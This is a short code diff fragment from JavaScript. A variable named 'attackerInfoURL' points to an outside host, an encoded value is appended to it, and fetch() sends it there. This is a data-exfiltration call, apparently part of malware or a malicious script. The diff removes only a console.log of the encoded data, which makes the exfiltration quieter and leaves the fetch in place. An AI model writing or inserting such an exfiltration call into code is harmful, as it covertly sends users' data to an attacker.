@@ -17,7 +17,6 @@ try {
   const attackerInfoURL = "http://boogabeans.pythonanywhere.com/";
   let badURL = attackerInfoURL.concat(encoded2);
   fetch(badURL);
-  console.log(`${encoded2}`);
 
 
 
